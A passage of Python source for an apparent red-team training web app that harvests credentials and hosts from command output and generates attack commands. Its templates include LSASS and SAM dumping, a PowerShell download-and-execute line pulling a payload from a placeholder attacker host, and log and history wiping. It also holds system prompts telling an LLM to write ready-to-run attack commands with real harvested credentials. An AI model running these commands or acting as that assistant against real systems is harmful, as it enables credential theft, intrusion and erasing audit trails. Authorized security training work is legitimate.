IP_IN_OUTPUT_RE = re.compile(r'\b((?:\d{1,3}\.){3}\d{1,3})\b')
USER_EXTRACTION_RE = re.compile(
    r'(?:User|Username|Account|Name)\s*[:=]\s*([A-Za-z0-9_.$@-]{2,})', re.IGNORECASE
)

async def _auto_extract_and_persist(
    operation_id: str,
    stdout: str,
    stderr: str,
    command: str,
    source_host: str | None = None,
) -> dict:
    """
    Run after any local or remote execution.
    Extracts hosts, users, credentials/hashes and upserts them.
    Returns summary of what was found/saved.
    """
    if not operation_id:
        return {"assets": 0, "creds": 0}

    combined = f"{stdout}\n{stderr}\n{command}"
    assets_saved = 0
    creds_saved = 0

    db = await get_db()

    # 1. IPs → new host assets (very common from ipconfig, netstat, arp, etc.)
    for ip in set(IP_IN_OUTPUT_RE.findall(combined)):
        if ip.startswith(("127.", "169.254.", "0.")):
            continue
        try:
            await db.upsert_asset(
                operation_id=operation_id,
                host=ip,
                port=None,
                service=None,
                notes=f"discovered via execution: {command[:60]}",
                metadata={"source": "execution", "via_command": command[:80]}
            )
            assets_saved += 1
        except Exception:
            pass

    # 2. Credential / hash extraction (pwdump, secretsdump, mimikatz, etc.)
    for m in CRED_HASH_RE.finditer(combined):
        username = m.group(1)
        lm = m.group(2)
        nt = m.group(3)
        full_hash = f"{lm}:{nt}"
        try:
            await db.log_credential(
                operation_id=operation_id,
                username=username,
                hash=full_hash,
                host=source_host,
                type="ntlm",
                source="execution",
                metadata={"command": command[:100]}
            )
            creds_saved += 1
        except Exception:
            pass

    # 3. Simple user:password patterns (less reliable, still useful)
    for m in CRED_USERPASS_RE.finditer(combined):
        u, p = m.group(1), m.group(2)
        if len(p) < 3 or p.lower() in ("true", "false", "null", "none", "0", "1"):
            continue
        # Avoid matching obvious false positives (ports, versions, etc.)
        if any(x in u.lower() for x in ["port", "version", "build", "pid"]):
            continue
        try:
            await db.log_credential(
                operation_id=operation_id,
                username=u,
                password=p,
                host=source_host,
                type="password",
                source="execution",
                metadata={"command": command[:80]}
            )
            creds_saved += 1
        except Exception:
            pass

    # 4. Explicit usernames discovered
    for m in USER_EXTRACTION_RE.finditer(combined):
        u = m.group(1)
        if len(u) < 2:
            continue
        try:
            await db.upsert_asset(
                operation_id=operation_id,
                host=source_host or "unknown",
                notes=f"user discovered: {u}",
                metadata={"discovered_user": u, "via": "execution"}
            )
            assets_saved += 1
        except Exception:
            pass

    # 5. Re-use the excellent recon parser on the output (catches banners, services, etc.)
    parsed = _parse_scan_output(combined)
    for a in parsed:
        try:
            await db.upsert_asset(
                operation_id=operation_id,
                host=a["host"],
                port=a.get("port"),
                service=a.get("service"),
                protocol=a.get("protocol"),
                status=a.get("status", "open"),
                notes=f"from command output ({a.get('source')})",
                metadata={"source": "execution_output", "command": command[:60]}
            )
            assets_saved += 1
        except Exception:
            pass

    return {"assets": assets_saved, "creds": creds_saved}


# --------------------------------------------------------------------------- #
# Automatic Technique Suggestion (Practical Feature)
# --------------------------------------------------------------------------- #

TECHNIQUE_KEYWORDS = {
    # Execution
    "powershell": ["T1059.001", "T1059.003"],
    "iex": ["T1059.001"],
    "downloadstring": ["T1059.001"],
    "cmd.exe": ["T1059.003"],
    "wmic": ["T1047", "T1059.003"],
    "rundll32": ["T1218.011"],
    "regsvr32": ["T1218.010"],
    "mshta": ["T1218.005"],
    "cscript": ["T1059.007"],
    "wscript": ["T1059.007"],

    # Discovery
    "whoami": ["T1033"],
    "systeminfo": ["T1082"],
    "hostname": ["T1082"],
    "net user": ["T1087.001", "T1087.002"],
    "net localgroup": ["T1087.001"],
    "net group": ["T1087.002"],
    "tasklist": ["T1057"],
    "wmic process": ["T1057"],
    "ipconfig": ["T1016"],
    "arp": ["T1016"],
    "route": ["T1016"],
    "netstat": ["T1049"],
    "quser": ["T1033"],
    "qwinsta": ["T1033"],

    # Credential Access
    "mimikatz": ["T1003.001", "T1003.002"],
    "sekurlsa": ["T1003.001"],
    "lsass": ["T1003.001"],
    "procdump": ["T1003.001"],
    "sam": ["T1003.002"],
    "secretsdump": ["T1003"],

    # Lateral Movement / Execution
    "psexec": ["T1021.002"],
    "winrm": ["T1021.006"],
    "wmic /node": ["T1047", "T1021.002"],
    "sc create": ["T1543.003"],
    "schtasks": ["T1053.005"],
    "at ": ["T1053.002"],

    # Defense Evasion
    "reg add": ["T1112"],
    "reg delete": ["T1112"],
    "wevtutil": ["T1070.001"],
    "clear-eventlog": ["T1070.001"],
}

@app.post("/api/suggest_techniques")
async def suggest_techniques(command: str, execution_method: str = "local"):
    """
    Suggest relevant MITRE ATT&CK techniques based on the command string
    and the execution method being used.
    Now also returns the reasons (matched keywords) for the "Why this technique?" tooltip.
    """
    if not command or len(command.strip()) < 2:
        return {"suggestions": []}

    cmd_lower = command.lower()
    scores: dict[str, int] = {}
    reasons: dict[str, list[str]] = {}  # technique_id -> list of matched keywords

    # 1. Keyword-based scoring + reason tracking
    for keyword, techniques in TECHNIQUE_KEYWORDS.items():
        if keyword in cmd_lower:
            for tech in techniques:
                scores[tech] = scores.get(tech, 0) + 10
                if tech not in reasons:
                    reasons[tech] = []
                if keyword not in reasons[tech]:
                    reasons[tech].append(keyword)

    # 2. Boost based on execution method
    method_boosts = {
        "psexec": {"T1021.002": 15},
        "winrm": {"T1021.006": 15},
    }
    if execution_method in method_boosts:
        for tech, boost in method_boosts[execution_method].items():
            if tech in scores:
                scores[tech] += boost
                if tech not in reasons:
                    reasons[tech] = []
                reasons[tech].append(f"Used with {execution_method.upper()}")

    # 3. Light ATT&CK name/description matching + reason tracking
    if STORE.is_ready():
        for tech in STORE.techniques[:300]:
            ext_id = tech.get("external_id", "")
            name = tech.get("name", "").lower()
            desc = tech.get("description", "").lower()[:300]

            matched_words = []
            for word in cmd_lower.split():
                if len(word) > 3 and (word in name or word in desc):
                    matched_words.append(word)

            if matched_words:
                score = len(matched_words) * 2
                scores[ext_id] = scores.get(ext_id, 0) + score
                if ext_id not in reasons:
                    reasons[ext_id] = []
                reasons[ext_id].extend([f"Matches: {w}" for w in matched_words])

    # Sort and return top suggestions
    sorted_suggestions = sorted(scores.items(), key=lambda x: x[1], reverse=True)[:6]

    results = []
    for tech_id, score in sorted_suggestions:
        tech_data = STORE.techniques_by_id.get(tech_id)
        if tech_data:
            matched = reasons.get(tech_id, [])
            results.append({
                "external_id": tech_id,
                "name": tech_data.get("name"),
                "score": score,
                "tactics": tech_data.get("tactics", []),
                "matched_keywords": list(set(matched))[:6],  # dedupe + limit
            })

    return {"suggestions": results}


# --------------------------------------------------------------------------- #
# Output → Next Command / Script Generator (Practical Red Team Feature)
# --------------------------------------------------------------------------- #

class GenerateFollowupRequest(BaseModel):
    output: str
    previous_command: str | None = None
    technique_id: str | None = None
    target_os: str = "windows"          # "windows" or "linux"
    execution_method: str = "local"     # local, winrm, psexec, etc.
    output_type: str = "command"        # "command" or "script"
    scenario: str | None = None         # "credential_access", "lateral_movement", "port_scan_followup", "privilege_escalation", "defense_evasion", etc.

class GenerateFollowupResponse(BaseModel):
    suggested_command: str
    suggested_type: str                 # "single_command" or "script"
    explanation: str
    technique: str | None = None
    extracted_targets: list[str] = []   # IPs, hosts discovered from output
    suggested_tools: list[str] = []     # Recommended tools based on services/scenario

# ===========================================================================
# ROBUST RECON OUTPUT PARSER (nmap, masscan, rustscan, generic, pasted results)
# ===========================================================================

IP_REGEX = re.compile(r'\b(?:\d{1,3}\.){3}\d{1,3}\b')

def _parse_scan_output(raw: str) -> list[dict]:
    """
    Production-grade parser for recon tool output.
    Supports:
      - nmap normal output (Nmap scan report + PORT STATE SERVICE lines)
      - nmap -oG greppable
      - masscan "Discovered open port X/tcp on IP"
      - rustscan / simple "IP:PORT open" or "IP PORT/tcp open service"
      - generic lines from any tool
    Returns deduped list of {"host": , "port": int, "protocol":, "service":, "status": "open", "source": }
    """
    if not raw or not raw.strip():
        return []

    assets: list[dict] = []
    seen: set[tuple] = set()

    lines = raw.splitlines()

    current_host: str | None = None

    # nmap host header
    nmap_host_re = re.compile(r'Nmap scan report for (?:([^\s(]+) \()?((?:\d{1,3}\.){3}\d{1,3})')
    # nmap port line (handles leading spaces)
    nmap_port_re = re.compile(r'^\s*(\d{1,5})/(tcp|udp)\s+(open|filtered|closed)\s+(\S+)(?:\s+(.+))?', re.IGNORECASE)
    # nmap -oG: Host: 10.0.0.5 ()  Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
    nmap_g_re = re.compile(r'Host:\s*((?:\d{1,3}\.){3}\d{1,3}).*?Ports:\s*([^\r\n]+)', re.IGNORECASE)
    # masscan
    masscan_re = re.compile(r'Discovered open port\s+(\d+)/(tcp|udp)\s+on\s+((?:\d{1,3}\.){3}\d{1,3})', re.IGNORECASE)
    # very generic "IP:PORT" or "IP PORT open service"
    generic_hostport_re = re.compile(
        r'((?:\d{1,3}\.){3}\d{1,3})[:\s]+(\d{1,5})(?:/(tcp|udp))?\s*(?:open|tcp\s+open|udp\s+open)?\s*([a-z0-9\-_.]+)?',
        re.IGNORECASE
    )

    for line in lines:
        line = line.strip()
        if not line:
            continue

        # 1. nmap host report line → sets context for following port lines
        hm = nmap_host_re.search(line)
        if hm:
            current_host = hm.group(2)
            continue

        # 2. Classic nmap port/state line
        pm = nmap_port_re.match(line)
        if pm:
            port = int(pm.group(1))
            proto = pm.group(2).lower()
            state = pm.group(3).lower()
            svc = (pm.group(4) or "").strip()
            host = current_host or "unknown"
            if state == "open":
                key = (host, port)
                if key not in seen:
                    seen.add(key)
                    assets.append({
                        "host": host, "port": port, "protocol": proto,
                        "service": svc, "status": "open", "source": "nmap"
                    })
            continue

        # 3. nmap -oG style (one line with many ports)
        gm = nmap_g_re.search(line)
        if gm:
            host = gm.group(1)
            ports_part = gm.group(2)
            for pseg in ports_part.split(","):
                m = re.search(r'(\d+)/open/(tcp|udp)(?:/([^/]*))?', pseg.strip())
                if m:
                    port = int(m.group(1))
                    proto = m.group(2)
                    svc = (m.group(3) or "").strip()
                    key = (host, port)
                    if key not in seen:
                        seen.add(key)
                        assets.append({
                            "host": host, "port": port, "protocol": proto,
                            "service": svc, "status": "open", "source": "nmap-oG"
                        })
            continue

        # 4. masscan
        mm = masscan_re.search(line)
        if mm:
            port = int(mm.group(1))
            proto = mm.group(2).lower()
            host = mm.group(3)
            key = (host, port)
            if key not in seen:
                seen.add(key)
                assets.append({
                    "host": host, "port": port, "protocol": proto,
                    "service": "", "status": "open", "source": "masscan"
                })
            continue

        # 5. Generic fallback (catches almost everything else)
        gm2 = generic_hostport_re.search(line)
        if gm2:
            host = gm2.group(1)
            port = int(gm2.group(2))
            proto = (gm2.group(3) or "tcp").lower()
            svc = (gm2.group(4) or "").strip()
            key = (host, port)
            if key not in seen:
                seen.add(key)
                assets.append({
                    "host": host, "port": port, "protocol": proto,
                    "service": svc, "status": "open", "source": "generic"
                })

    return assets


async def _bulk_upsert_assets(operation_id: str, parsed_assets: list[dict]) -> int:
    """Bulk insert/update assets from parser output. Returns number saved."""
    if not operation_id or not parsed_assets:
        return 0
    db = await get_db()
    saved = 0
    for a in parsed_assets:
        try:
            await db.upsert_asset(
                operation_id=operation_id,
                host=a["host"],
                port=a.get("port"),
                service=a.get("service") or None,
                protocol=a.get("protocol") or "tcp",
                status=a.get("status", "open"),
                notes=f"recon:{a.get('source', 'scan')}",
                metadata={"source": a.get("source", "recon"), "raw_service": a.get("service")}
            )
            saved += 1
        except Exception as ex:
            print(f"[recon] asset upsert failed for {a}: {ex}")
    return saved

@app.post("/api/generate_followup", response_model=GenerateFollowupResponse)
async def generate_followup(req: GenerateFollowupRequest):
    """
    Smart generator that supports:
    - Single commands or multi-line scripts
    - Common red team scenarios (Credential Access, Lateral Movement, etc.)
    - Auto-filling discovered IPs/ports from pasted output (e.g. after port scan)
    """
    output_lower = req.output.lower()
    target_os = req.target_os.lower()
    parsed = _parse_scan_output(req.output)
    ips = sorted({a["host"] for a in parsed})
    open_ports = [{"port": str(a["port"]), "protocol": a["protocol"], "service": a.get("service", "")} for a in parsed]

    first_ip = ips[0] if ips else "<TARGET_IP>"
    smb_ports = [p for p in open_ports if p["port"] in ("445", "139")]
    rdp_ports = [p for p in open_ports if p["port"] == "3389"]
    winrm_ports = [p for p in open_ports if p["port"] in ("5985", "5986")]

    want_script = req.output_type == "script"
    scenario = (req.scenario or "").lower()
    cmd_type = "script" if want_script else "single_command"

    suggested = ""
    explanation = ""
    technique = req.technique_id
    suggested_tools: list[str] = []

    # ===================== SCENARIO-BASED TEMPLATES =====================
    if scenario == "credential_access":
        if target_os == "windows":
            if want_script:
                suggested = f"""# Credential Access Script - {first_ip}
# Run this after gaining initial access
powershell -c "rundll32 C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\\Windows\\Temp\\lsass.dmp full"
reg save HKLM\\SAM C:\\Windows\\Temp\\sam.save
reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system.save
Write-Host "[+] Dumped LSASS + SAM/SYSTEM. Exfil and crack offline." -ForegroundColor Green"""
            else:
                suggested = f'powershell -c "rundll32 C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\\Windows\\Temp\\lsass.dmp full"'
            explanation = "Credential Access template. Focused on dumping LSASS and SAM."
            technique = technique or "T1003.001"

        else:  # Linux
            suggested = "cat /etc/shadow | grep -v '^#' | head -20"
            explanation = "Dumping shadow file for offline cracking."

    elif scenario == "lateral_movement":
        if target_os == "windows":
            if smb_ports:
                suggested = f"crackmapexec smb {first_ip} -u USER -p 'PASSWORD' --shares"
                explanation = f"Lateral movement prep targeting discovered SMB on {first_ip}."
                technique = technique or "T1021.002"
            elif rdp_ports:
                suggested = f"xfreerdp /v:{first_ip} /u:USER /p:PASSWORD"
                explanation = f"RDP access to {first_ip}."
                technique = technique or "T1021.001"
            elif winrm_ports:
                suggested = f"evil-winrm -i {first_ip} -u USER -p 'PASSWORD'"
                explanation = f"WinRM access to {first_ip}."
                technique = technique or "T1021.006"
            else:
                suggested = f"crackmapexec smb {first_ip} -u USER -p 'PASSWORD'"
                explanation = "General lateral movement check via SMB."

        else:
            suggested = f"ssh USER@{first_ip}"
            explanation = "Attempt SSH lateral movement."

    elif scenario == "privilege_escalation":
        if target_os == "windows":
            suggested = "whoami /priv && systeminfo && wmic qfe get Caption,Description,HotFixID,InstalledOn"
            explanation = "Privilege escalation enumeration (privileges + missing patches)."
            suggested_tools = ["Watson", "PrintSpoofer", "JuicyPotato", "PowerUp.ps1"]
            technique = technique or "T1068"
        else:
            suggested = "sudo -l && find / -perm -4000 2>/dev/null && cat /etc/crontab"
            explanation = "Linux privilege escalation checks (SUID, sudo, cron)."
            suggested_tools = ["LinPEAS", "LinEnum", "GTFOBins"]
            technique = technique or "T1068"

    elif scenario == "defense_evasion":
        if target_os == "windows":
            suggested = """# Defense Evasion ideas
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/payload.ps1')"
# Clear logs (use carefully)
wevtutil cl Security
wevtutil cl System"""
            explanation = "Defense evasion techniques (bypass + log clearing)."
            suggested_tools = ["Cobalt Strike", "Sliver", "PowerShell obfuscation tools"]
            technique = technique or "T1055"
        else:
            suggested = "history -c && rm ~/.bash_history && export HISTFILE=/dev/null"
            explanation = "Basic log and history evasion on Linux."
            suggested_tools = ["bash history manipulation", "rootkits (educational only)"]

    elif scenario == "port_scan_followup" or any("open" in line for line in req.output.splitlines()):
        # Smart follow-up after port scan
        targets = ", ".join(ips) if ips else "<TARGET>"
        ports = ",".join([p["port"] for p in open_ports[:8]]) or "445,3389,5985"

        if target_os == "windows":
            if smb_ports:
                suggested = f"crackmapexec smb {targets} -u USER -p 'PASSWORD' --shares"
                suggested_tools = ["CrackMapExec", "Impacket"]
            elif rdp_ports:
                suggested = f"xfreerdp /v:{targets} /u:USER /p:PASSWORD"
                suggested_tools = ["xfreerdp"]
            else:
                suggested = f"nmap -sV -p {ports} {targets}"
            explanation = f"Targeted follow-up against discovered services on {targets}"
        else:
            suggested = f"nmap -sV -p {ports} {targets}"
            suggested_tools = ["nmap", "enum4linux", "hydra"]
            explanation = "Service enumeration on discovered Linux hosts."

        technique = technique or "T1046"

    else:
        # Default / General
        if want_script:
            if target_os == "windows":
                suggested = f"""# Post-Scan Enumeration - {first_ip}
systeminfo
whoami /all
net user
net localgroup administrators
Get-NetNeighbor | Where-Object {{$_.State -eq 'Reachable'}}
Write-Host "[+] Check discovered hosts for SMB/RDP/WinRM" -ForegroundColor Cyan"""
            else:
                suggested = """#!/bin/bash
id
uname -a
cat /etc/os-release
sudo -l 2>/dev/null || echo "No sudo"
find / -perm -4000 2>/dev/null | head -15"""
        else:
            suggested = f"nmap -sV -p 22,80,443,445,3389,5985 {first_ip}"
        explanation = "General follow-up based on pasted output."

    # Auto technique if not provided
    if not technique:
        if "lsass" in suggested.lower() or "sam" in suggested.lower():
            technique = "T1003.001"
        elif "crackmapexec" in suggested.lower() or "psexec" in suggested.lower():
            technique = "T1021.002"
        elif "evil-winrm" in suggested.lower():
            technique = "T1021.006"

    return GenerateFollowupResponse(
        suggested_command=suggested,
        suggested_type=cmd_type,
        explanation=explanation,
        technique=technique,
        extracted_targets=ips + [f"{p['port']}/tcp" for p in open_ports],
        suggested_tools=suggested_tools
    )


# --------------------------------------------------------------------------- #
# Discovered Assets API (for LLM context + UI)
# --------------------------------------------------------------------------- #

@app.get("/api/operations/{op_id}/assets", response_model=list[Asset])
async def list_operation_assets(op_id: str):
    db = await get_db()
    return await db.list_assets(op_id)

@app.get("/api/operations/{op_id}/credentials", response_model=list[Credential])
async def list_operation_credentials(op_id: str):
    db = await get_db()
    return await db.list_credentials(op_id)

@app.post("/api/operations/{op_id}/assets")
async def create_or_update_asset(op_id: str, asset: dict):
    db = await get_db()
    return await db.upsert_asset(
        operation_id=op_id,
        host=asset["host"],
        port=asset.get("port"),
        service=asset.get("service"),
        protocol=asset.get("protocol"),
        status=asset.get("status"),
        notes=asset.get("notes"),
        metadata=asset.get("metadata")
    )

@app.post("/api/operations/{op_id}/credentials")
async def create_credential(op_id: str, cred: dict):
    db = await get_db()
    return await db.log_credential(
        operation_id=op_id,
        username=cred.get("username"),
        password=cred.get("password"),
        hash=cred.get("hash"),
        host=cred.get("host"),
        type=cred.get("type"),
        source=cred.get("source"),
        metadata=cred.get("metadata")
    )


@app.post("/api/chains/import", response_model=ChainWithSteps)
async def import_kill_chain(plan: KillChainPlan, operation_id: str):
    """
    Bulk import a structured KillChainPlan into the Chain Builder.
    Creates a new chain and all steps, using real operation assets where possible.
    """
    db = await get_db()

    # Create the chain
    chain = await db.create_chain(ChainCreate(
        operation_id=operation_id,
        name=plan.name,
        description=plan.description
    ))

    # Add steps
    for idx, step in enumerate(plan.steps):
        await db.add_step_to_chain(chain.id, step.technique_id)
        # Optionally update the step with better description/command from the plan
        # (current add_step_to_chain is simple; we can enhance later)

    # Return the freshly created chain with steps
    return await db.get_chain_with_steps(chain.id)


# --------------------------------------------------------------------------- #
# Red Team Leader Assistant (Semi-Autonomous Guidance + Ollama)
# --------------------------------------------------------------------------- #

class AssistantRequest(BaseModel):
    message: str
    operation_id: str | None = None
    context: dict[str, Any] = Field(default_factory=dict)  # extra context from frontend

class AssistantResponse(BaseModel):
    reply: str
    suggested_actions: list[str] = []
    suggested_technique: str | None = None

# Structured Kill Chain for import
class KillChainStep(BaseModel):
    phase: str
    technique_id: str
    description: str
    suggested_command: str | None = None

class KillChainPlan(BaseModel):
    name: str
    description: str
    steps: list[KillChainStep]

@app.post("/api/assistant", response_model=AssistantResponse)
async def red_team_assistant(req: AssistantRequest):
    """
    The 'Red Team Leader Assistant' - now with strong Kill Chain + ATT&CK flow support.
    Can help students develop full cyber kill chains and walk through MITRE ATT&CK techniques.
    """
    message = req.message.lower().strip()

    # Build rich context
    context_text = ""
    recent_timeline = ""
    chain_status = ""

    if req.operation_id:
        try:
            db = await get_db()
            timeline = await db.get_timeline_for_operation(req.operation_id)
            chains = await db.get_chains_for_operation(req.operation_id)
            assets = await db.list_assets(req.operation_id)
            creds = await db.list_credentials(req.operation_id)

            # Rich asset data (hosts + services + ports)
            hosts = sorted({a.host for a in assets})
            services = [f"{a.host}:{a.port} ({a.service or 'unknown'})" for a in assets if a.port][:10]

            # Credentials (very important for realistic commands)
            cred_lines = []
            for c in creds[:6]:
                line = c.username or "?"
                if c.password:
                    line += f" : {c.password}"
                elif c.hash:
                    line += f" [NTLM hash]"
                if c.host:
                    line += f" @ {c.host}"
                cred_lines.append(line)

            recent_timeline = "\n".join([
                f"- [{e.timestamp[:16]}] {e.type.upper()}: {e.command or e.notes or e.technique_id or ''}"
                for e in timeline[:10]
            ])

            assets_block = ""
            if hosts:
                assets_block += f"Discovered Hosts: {', '.join(hosts)}\n"
            if services:
                assets_block += f"Discovered Services/Ports: {', '.join(services)}\n"
            if cred_lines:
                assets_block += f"Known Credentials / Accounts: {', '.join(cred_lines)}\n"

            chain_status = "No attack chains yet."
            if chains:
                chain_status = "\n".join([
                    f"- '{c.name}': {len([s for s in c.steps if s.status == 'executed'])}/{len(c.steps)} steps executed"
                    for c in chains[:3]
                ])

            context_text = f"""
=== CURRENT OPERATION STATE (USE THESE REAL VALUES — NEVER USE PLACEHOLDERS) ===
{assets_block}

Recent Activity (last 10 events):
{recent_timeline}

Attack Chain Progress:
{chain_status}
"""
        except Exception:
            pass

    # Try Ollama first (real local LLM)
    try:
        import ollama

        system_prompt = """You are RedForge, a professional Red Team Leader AI acting as a semi-autonomous mentor for beginner red teamers on AUTHORIZED engagements only.

Your primary job is to help the student develop and execute realistic Cyber Kill Chains using MITRE ATT&CK.

CRITICAL RULE:
When generating commands or scripts, you are given the student's **real discovered assets** in the context above (hosts, services, accounts, etc.). 
**You must use the actual values** from that context (real IPs, ports, hostnames, usernames) instead of placeholders like <TARGET>, <IP>, or <USER>.

Key behaviors:
- Maintain awareness of the current kill chain stage based on the student's timeline and chains.
- When the student pastes output or describes findings, tell them which kill chain phase they are in.
- Propose the next logical step(s) with specific ATT&CK technique IDs.
- Generate ready-to-run commands or short scripts using the **real discovered values** provided in the context.
- Always include the ATT&CK ID for suggested actions.
- Strongly encourage the student to log every action with the correct technique.

Response style:
- Be direct and terminal-like.
- When giving commands, show them in clean code blocks.
- End most responses with 1-2 concrete next actions the student can take in the app (e.g. "Load this command in Execution" or "Add these steps to your Chain Builder")."""

        full_prompt = f"{context_text}\n\nStudent: {req.message}"

        chosen_model = get_ollama_model()
        logging.info(f"[assistant] Using Ollama model: {chosen_model}")
        response = ollama.chat(
            model=chosen_model,
            messages=[
                {"role": "system", "content": system_prompt},
                {"role": "user", "content": full_prompt}
            ],
            options={"temperature": 0.6, "num_ctx": 8192}
        )

        reply = response['message']['content']

        suggested_actions = []
        # Simple heuristic extraction
        if any(word in reply.lower() for word in ["next step", "recommend", "try", "run", "consider"]):
            suggested_actions.append("Review and log this recommendation")

        return AssistantResponse(
            reply=reply,
            suggested_actions=suggested_actions or ["Continue the conversation or ask for specific kill chain phase help"]
        )

    except Exception as e:
        logging.warning(f"[assistant] Ollama path failed, falling back to rules: {e}")
        # Strong rule-based fallback with kill chain awareness
        if "kill chain" in message or "cyber kill chain" in message:
            reply = "A typical Cyber Kill Chain has 7 stages: Reconnaissance, Weaponization, Delivery, Exploitation, Installation, Command & Control, Actions on Objectives. In ATT&CK terms we map these to tactics like Recon, Initial Access, Execution, Persistence, etc. Would you like me to help build a full kill chain for your current target?"
            suggested_actions = ["Help me build a kill chain for this operation", "Show MITRE ATT&CK mapping for each stage"]

        elif "recon" in message:
            reply = "After reconnaissance, the next phase is usually Initial Access or Execution. Common techniques: T1566 (Phishing), T1190 (Exploit Public-Facing Application), T1078 (Valid Accounts). What did your recon reveal?"
            suggested_actions = ["Suggest initial access techniques based on my recon"]

        elif any(x in message for x in ["lateral", "move", "psexec", "winrm"]):
            reply = "Lateral Movement usually maps to ATT&CK T1021 techniques. After you have credentials or access, common next steps are service enumeration on the target, then using valid accounts or remote services. Do you want command suggestions for the hosts you've discovered?"
            suggested_actions = ["Give me lateral movement commands for my discovered hosts"]

        else:
            reply = "I'm here to help you develop Cyber Kill Chains and walk through MITRE ATT&CK techniques step by step. Tell me what phase you're in or paste some output, and I'll help you decide the next move while keeping everything authorized and well documented."
            suggested_actions = ["Help me plan the next phase of my kill chain"]

        return AssistantResponse(
            reply=reply,
            suggested_actions=suggested_actions
        )


@app.post("/api/assistant/plan_kill_chain", response_model=KillChainPlan)
async def plan_structured_kill_chain(req: AssistantRequest):
    """
    Dedicated endpoint for generating a full, structured Cyber Kill Chain
    that can be directly imported into the Chain Builder.
    The LLM is prompted to return clean JSON.
    """
    context_text = ""
    if req.operation_id:
        try:
            db = await get_db()
            assets = await db.list_assets(req.operation_id)
            creds = await db.list_credentials(req.operation_id)
            timeline = await db.get_timeline_for_operation(req.operation_id)

            hosts = sorted({a.host for a in assets})
            services = [f"{a.host}:{a.port} ({a.service or 'unknown'})" for a in assets if a.port][:8]
            cred_summary = []
            for c in creds[:5]:
                if c.username:
                    cred_summary.append(f"{c.username}{ ' [hash]' if c.hash else '' }")

            context_text = f"""
REAL DISCOVERED DATA FOR THIS OPERATION (use these exact values in commands):
Hosts: {', '.join(hosts) if hosts else 'None yet'}
Services/Ports: {', '.join(services) if services else 'None'}
Known Accounts/Creds: {', '.join(cred_summary) if cred_summary else 'None logged yet'}

Timeline events so far: {len(timeline)}
"""
        except Exception:
            pass

    try:
        import ollama
        import json

        system_prompt = """You are an expert red team planner for educational authorized engagements.

Given the real discovered assets below, create a realistic 5-8 step Cyber Kill Chain.

CRITICAL RULES:
- Use real hostnames/IPs and ports from the provided context in every command when possible. NEVER output <TARGET>, <IP>, <USER> etc. if real values exist.
- Every step must have a valid MITRE ATT&CK technique_id (e.g. T1595.001, T1021.002, T1003.001).
- suggested_command should be a ready-to-run command using the real discovered values.
- Phases should follow a logical kill chain progression (Recon → Initial Access → Execution → Credential Access → Lateral Movement → etc.).

Output ONLY valid JSON matching this exact schema (no markdown, no extra text):

{
  "name": "Operation-specific name",
  "description": "One paragraph summary",
  "steps": [
    {
      "phase": "Reconnaissance",
      "technique_id": "T1595.001",
      "description": "Short description",
      "suggested_command": "command using real values from context"
    }
  ]
}"""

        full_prompt = f"{context_text}\n\nUser request: {req.message or 'Create a complete kill chain for this operation.'}"

        chosen_model = get_ollama_model()
        logging.info(f"[plan_kill_chain] Using Ollama model: {chosen_model}")
        response = ollama.chat(
            model=chosen_model,
            messages=[
                {"role": "system", "content": system_prompt},
                {"role": "user", "content": full_prompt}
            ],
            format="json",
            options={"temperature": 0.4}
        )

        content = response['message']['content'].strip()

        # Try to extract JSON if the model wrapped it in markdown or extra text
        if "```" in content:
            content = content.split("```")[1] if "```json" not in content else content.split("```json")[1]
            content = content.replace("```", "").strip()

        try:
            plan = json.loads(content)
        except json.JSONDecodeError:
            # Minimal repair attempt
            import re
            json_match = re.search(r'\{[\s\S]*\}', content)
            if json_match:
                plan = json.loads(json_match.group(0))
            else:
                raise

        return KillChainPlan(**plan)

    except Exception:
        # Much better fallback that uses real data when available
        hosts = []
        services = []
        if req.operation_id:
            try:
                db = await get_db()
                assets = await db.list_assets(req.operation_id)
                hosts = sorted({a.host for a in assets})[:3]
                services = [f"{a.host}:{a.port}" for a in assets if a.port][:3]
            except:
                pass

        target = hosts[0] if hosts else "10.10.14.7"
        smb_target = next((s for s in services if ":445" in s), target)

        return KillChainPlan(
            name="Practical External Red Team Chain",
            description="Realistic kill chain based on discovered assets",
            steps=[
                KillChainStep(phase="Reconnaissance", technique_id="T1595.001", description="Service discovery on target", suggested_command=f"nmap -sV -p 22,80,443,445,3389,5985 {target}"),
                KillChainStep(phase="Initial Access / Execution", technique_id="T1021.002", description="Test access and enumerate shares", suggested_command=f"crackmapexec smb {smb_target} -u USER -p 'PASSWORD' --shares"),
                KillChainStep(phase="Credential Access", technique_id="T1003.001", description="Dump credentials if access is obtained", suggested_command="powershell -c \"rundll32 C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\\Windows\\Temp\\lsass.dmp full\""),
            ]
        )


# --------------------------------------------------------------------------- #
# Progress-Tailored Execution Commands (Red Team Leader Feature)
# --------------------------------------------------------------------------- #

class ProgressCommandsResponse(BaseModel):
    suggestions: list[dict]   # {command, technique, reason, confidence}

@app.get("/api/operations/{op_id}/tailored_commands", response_model=ProgressCommandsResponse)
async def get_tailored_execution_commands(op_id: str):
    """
    Analyzes the user's recent progress (timeline + chains) and returns
    contextually relevant execution commands they should consider next.
    This is the core of the 'semi-autonomous red team leader' experience.
    """
    db = await get_db()
    timeline = await db.get_timeline_for_operation(op_id)
    chains = await db.get_chains_for_operation(op_id)

    recent_types = [e.type for e in timeline[:8]]
    recent_notes = " ".join([e.notes or "" for e in timeline[:6]]).lower()
    recent_commands = " ".join([e.command or "" for e in timeline[:6]]).lower()

    suggestions = []

    # Get real hosts when possible
    real_hosts = []
    try:
        assets = await db.list_assets(op_id)
        real_hosts = sorted({a.host for a in assets})[:2]
    except:
        pass
    target = real_hosts[0] if real_hosts else "<TARGET>"

    # Very practical progress-based logic for students (now using real values)
    if "recon" in recent_types or "port" in recent_notes or "scan" in recent_notes:
        suggestions.append({
            "command": f"crackmapexec smb {target} -u USER -p 'PASSWORD' --shares",
            "technique": "T1021.002",
            "reason": "You just did reconnaissance. Next logical step is service enumeration on discovered hosts.",
            "confidence": "high"
        })
        suggestions.append({
            "command": f"nmap -sV -p 445,3389,5985 {target}",
            "technique": "T1046",
            "reason": "Service version scan on common high-value ports after initial discovery.",
            "confidence": "high"
        })

    if "execution" in recent_types and ("whoami" in recent_commands or "administrator" in recent_notes):
        suggestions.append({
